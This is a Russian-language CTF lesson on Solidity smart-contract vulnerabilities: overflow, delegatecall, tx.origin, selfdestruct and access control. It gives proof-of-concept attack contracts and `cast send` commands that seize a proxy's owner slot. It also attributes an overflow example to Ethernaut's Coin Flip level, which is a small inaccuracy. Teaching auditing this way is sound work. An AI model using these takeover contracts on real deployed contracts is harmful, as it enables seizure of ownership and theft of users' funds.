---
id: misc-blockchain-solidity
title: "Solidity: уязвимости смарт-контрактов"
category: misc
parent: misc-blockchain
difficulty: hard
order: 1
tags: [solidity, evm, smart-contract, overflow, delegatecall, tx-origin, ctf]
prerequisites: [misc-blockchain]
useful_for:
  - "CTF Blockchain категория"
  - "Аудит смарт-контрактов"
  - "Bug bounty Web3"
estimated_minutes: 35
summary: "Модель EVM, типы и видимость в Solidity, integer overflow, delegatecall, tx.origin, selfdestruct и контроль доступа — с полными примерами и PoC."
---

Solidity — основной язык смарт-контрактов Ethereum. В CTF задача почти всегда формулируется так: «дан контракт, найдите способ перевести его баланс на свой адрес» или «сделайте так, чтобы `isSolved()` вернул true». Чтобы это сделать, надо понимать модель исполнения EVM и знать каталог типовых уязвимостей. Этот урок — практический минимум.

## Модель исполнения EVM

Ethereum — это одна большая машина состояний. Каждый контракт — это аккаунт с кодом и балансом. Вызов контракта компилируется в байткод EVM, который исполняется всеми нодами и изменяет глобальное состояние. Ключевые понятия:

- **Storage** — постоянное хранилище, 256-битные слоты, дорогое (`SSTORE` ~20000 газа при записи нового значения).
- **Memory** — временная память на время вызова, дешёвая.
- **Calldata** — входные данные транзакции, только для чтения.
- **`msg.sender`** — адрес, который непосредственно вызвал контракт (может быть другим контрактом).
- **`tx.origin`** — адрес внешнего (EOA) инициатора всей цепочки вызовов.
- **`msg.value`** — количество wei, приложенных к вызову.

Функции, помеченные `view`/`pure`, не меняют состояние; `payable` — могут принимать эфир. Модификатор `external`/`public` делает функцию вызываемой извне.

## Типы, видимость и хранилище

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Vault {
    mapping(address => uint256) public balances; // public => авто-геттер
    uint256 private secret;                       // private НЕ значит недоступно!
    address owner;

    constructor() { owner = msg.sender; }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "no funds");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
        balances[msg.sender] -= amount;
    }
}
```

Обратите внимание: `private` переменные видны любому — они просто не имеют геттера. Читать storage можно через `cast storage`, `eth_getStorageAt` или RPC-вызов. Это первая вещь, которую делают в CTF: смотрят, что лежит в слотах 0, 1, 2.

## Integer overflow / underflow

До Solidity 0.8.0 арифметика не проверялась: `uint8(0) - 1` давало `255`. В 0.8+ компилятор вставляет проверки, и переполнение вызывает `revert`. Но:

- `unchecked { ... }` блок отключает проверки — источник багов;
- приведение типов `uint256(x)` к меньшему типу обрезает старшие биты;
- `abi.decode` и assembly могут дать неожиданные значения.

```solidity
function badWithdraw(uint256 amount) external {
    unchecked {
        // если amount > balance, получим огромное число
        balances[msg.sender] -= amount;
    }
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok);
}
```

Здесь при `amount > balance` андерфлоу даёт гигантское число — и следующий вывод пройдёт. Это классический «bank» из Ethernaut (уровень Coin Flip/Token).

## delegatecall — самый коварный

`delegatecall` выполняет код чужого контракта **в контексте вызывающего**: storage, `msg.sender`, `msg.value` — от вызывающего. Если контракт хранит адрес библиотеки, которую можно подменить, атакующий указывает свой контракт и перезаписывает, например, `owner`.

```solidity
contract Proxy {
    address public implementation; // slot 0
    address public owner;          // slot 1
    constructor(address impl) { implementation = impl; owner = msg.sender; }

    fallback() external payable {
        (bool ok, ) = implementation.delegatecall(msg.data);
        require(ok);
    }
}
```

Атакующий вызывает `implementation` функцию `pwn()`, которая пишет `owner = msg.sender`. Поскольку delegatecall выполняется в storage `Proxy`, а `owner` — слот 1, злоумышленник становится владельцем. В CTF-задачах часто просят «стать owner».

## tx.origin: почему это ловушка

```solidity
contract Phishable {
    address public owner;
    constructor() { owner = msg.sender; }
    function withdrawAll(address payable _to) public {
        require(tx.origin == owner); // ОПАСНО
        _to.transfer(address(this).balance);
    }
}
```

Если владелец вызовет атакующий контракт, тот внутри вызовет `withdrawAll`, и `tx.origin` будет адресом владельца, хотя `msg.sender` — контракт атакующего. Правильно — `require(msg.sender == owner)`.

## Контроль доступа и selfdestruct

Типичные ошибки: забытая проверка `onlyOwner`, публичная функция инициализации, отсутствие `initializer`-модификатора в upgradable-контрактах. `selfdestruct(payable(addr))` уничтожает контракт и отправляет баланс. В старых версиях его можно было вызвать извне и «убить» контракт; также `selfdestruct` — способ принудительно отправить эфир на контракт (ломает логику с `address(this).balance == 0`).

## Полный разобранный пример (Ethernaut-like)

Дано:

```solidity
contract Force { /* принимает эфир только если ... */ }
contract Solve {
    address target;
    constructor(address _t) { target = _t; }
    function exploit() external payable {
        selfdestruct(payable(target)); // force-send эфир на target
    }
}
```

Команды (Foundry):

```bash
forge init ctf && cd ctf
# пишем тест
forge test -vvv
```

```solidity
function testForce() public {
    Force f = Force(target);
    assertEq(address(f).balance, 0);
    new Solve{value: 1 ether}(address(f));
    assertGt(address(f).balance, 0);
}
```

Результат:

```
[PASS] testForce() (gas: 123456)
```

## Инструменты для статического анализа

- `slither .` — статический анализатор, выдаёт detectors (reentrancy-eth, arbitrary-send, delegatecall).
- `mythril analyze` — символьное исполнение.
- `solc --storage-layout` — раскладка слотов.
- `cast storage <addr> <slot>` — чтение слота из сети/форка.

## Частые ошибки и подводные камни

- Считать `private` реальной защитой — данные в блокчейне публичны.
- Забывать про `fallback`/`receive` и `msg.value` при `delegatecall`.
- Путать `msg.sender` и `tx.origin`.
- Игнорировать `unchecked` и assembly-вставки.
- Думать, что `require` сработает, если проверка стоит **после** внешнего вызова.

## Что дальше / решение

Изучив каталог, переходите к `misc-blockchain-reentrancy` — там вы напишете полноценный атакующий контракт с повторным входом. Поставьте Foundry, разверните учебные контракты Ethernaut локально и пройдите первые 10 уровней. Затем `misc-blockchain-tools` закрепит работу с `cast`/`anvil`.

## Справочная таблица уязвимостей

| Уязвимость | Суть | Защита |
|-----------|------|--------|
| Integer overflow | Арифметика выходит за диапазон | Solidity ≥0.8, `SafeMath`, осторожный `unchecked` |
| Reentrancy | Внешний вызов до обновления состояния | checks-effects-interactions, reentrancy guard |
| delegatecall | Выполнение чужого кода в своём storage | Не подменяемый адрес реализации |
| tx.origin | Авторизация по внешнему адресу | Использовать `msg.sender` |
| Access control | Нет/слабая проверка прав | `onlyOwner`, `initializer`, роли |
| selfdestruct | Уничтожение/принудительный перевод | Не полагаться на баланс |
| Weak randomness | `block.timestamp`/`blockhash` как источник | Commit-reveal, VRF |

## Дополнительная теория: storage, gas и фронтраннинг

EVM-хранилище — массив 256-битных слотов, и раскладка переменных предсказуема: скаляры занимают слоты по порядку, `mapping` — по `keccak256(key . slot)`, динамические массивы — по `keccak256(slot)`. Solidity упаковывает несколько маленьких переменных в один слот, что важно при ручном чтении. Через `cast storage` и `eth_getStorageAt` можно читать «приватные» данные — это первое, что делают в CTF. Газ тоже часть модели: `SSTORE` дорог, `CALL` передаёт газ, а лимит 2300 у `transfer` — историческая «защита», которая сегодня ломает совместимость. Понимание газа нужно для расчёта эксплойтов и для отладки «почему транзакция падает по out-of-gas».

Отдельно — **фронтраннинг**: если контракт полагается на `block.timestamp` или `blockhash` как на случайность, валидатор может предсказать/подстроить результат. Это уязвимость слабой случайности, часто встречающаяся в задачах про лотереи.

## Компилятор, версии и assembly

Уязвимости зависят от версии Solidity. До 0.8.0 нет проверок переполнения — нужен `SafeMath`. Разные версии по-разному оптимизируют и по-разному обрабатывают `unchecked`, `immutable`, `custom errors`. Inline assembly (`assembly { ... }`) обходит проверки компилятора и часто содержит баги: работа со слотами, `delegatecall`, чтение calldata. При аудите всегда смотрите версию (`pragma`) и наличие assembly. Также обращайте внимание на `constructor` vs `initializer` (upgradable-контракты без `initializer` можно переинициализировать и захватить владение).

## Разбор ошибок и отладка

Если контракт не компилируется — проверьте `pragma` и импорты. Если вызов ревертится — читайте причину (`require`-строку или custom error); `cast call` покажет её. Если «owner не меняется» — возможно, вы пишете не в тот слот (delegatecall-контекст) или не тот тип. Если эксплойт «не проходит» — используйте `forge test -vvvv`, чтобы увидеть трассировку и точку реверта. Проверяйте раскладку storage (`solc --storage-layout`, `cast storage`), особенно при delegatecall. И помните про `fallback`/`receive`: контракт может не принимать эфир.

## Практический разбор: захват владения через delegatecall

Дано:

```solidity
contract Proxy {
    address public implementation; // slot 0
    address public owner;          // slot 1
    fallback() external payable {
        (bool ok,) = implementation.delegatecall(msg.data);
        require(ok);
    }
}
```

`implementation` можно задать (например, через публичный setter или он уже указывает на контракт с `pwn`). Пишем атакующий контракт:

```solidity
contract Attack {
    function pwn() external { // выполнится в storage Proxy
        assembly { sstore(1, caller()) } // slot 1 = msg.sender
    }
}
```

Вызываем через fallback Proxy:

```bash
cast send 0xPROXY "pwn()" --private-key $PK --rpc-url $RPC
cast call 0xPROXY "owner()(address)"
# 0x... наш адрес
```

Мы стали владельцем, потому что `delegatecall` исполнил `pwn` в контексте Proxy, записав наш адрес в слот 1 (`owner`). В Foundry то же самое:

```solidity
function testTakeover() public {
    address(proxy).call(abi.encodeWithSignature("pwn()"));
    assertEq(Proxy(proxy).owner(), address(this));
}
```

Ключ — понять раскладку storage: `owner` в слоте 1. Если бы порядок был другим, слот изменился бы. Всегда проверяйте `solc --storage-layout` и используйте `cast storage` для проверки результата.

## Квиз

```quiz
- question: "Что означает модификатор `private` для переменной Solidity?"
  options:
    - "Переменную нельзя прочитать никому, включая через RPC"
    - "Нет авто-геттера, но значение видно в storage"
    - "Переменная хранится в calldata"
    - "Она доступна только конструктору"
  answer: 1
  explanation: "Все данные блокчейна публичны; private лишь убирает геттер."
- question: "Почему `delegatecall` в прокси-контракте опасен при подменяемом адресе реализации?"
  options:
    - "Чужой код исполняется в storage вызывающего и может перезаписать owner"
    - "Он всегда дороже обычного call"
    - "Он не поддерживает payable"
    - "Он блокирует слот 0"
  answer: 0
  explanation: "Контекст (storage/msg.sender) остаётся от прокси."
- question: "Какое условие авторизации корректно?"
  options:
    - "require(tx.origin == owner)"
    - "require(msg.sender == owner)"
    - "require(block.coinbase == owner)"
    - "require(gasleft() > 0)"
  answer: 1
  explanation: "msg.sender — непосредственный вызывающий, его нельзя подделать через промежуточный контракт."
- question: "Когда integer underflow в Solidity 0.8+ возможен?"
  options:
    - "Всегда"
    - "Внутри блока `unchecked` или при сужении типа"
    - "Только в view-функциях"
    - "Никогда"
  answer: 1
  explanation: "0.8 вставляет проверки, но unchecked их отключает."
- question: "Что делает `selfdestruct`?"
  options:
    - "Отправляет весь баланс контракта указанному адресу и удаляет код"
    - "Удаляет storage всех пользователей"
    - "Паузит контракт"
    - "Меняет owner"
  answer: 0
  explanation: "Это способ и уничтожить контракт, и принудительно перевести эфир."
```

## Где пригодится

- **CTF:** категория Blockchain — от чтения контракта до PoC-эксплойта.
- **Аудит:** реальный аудит Solidity-проектов, отчёты.
- **Bug bounty:** Immunefi и Web3-программы.
- **Работа:** безопасность DeFi, разбор инцидентов.
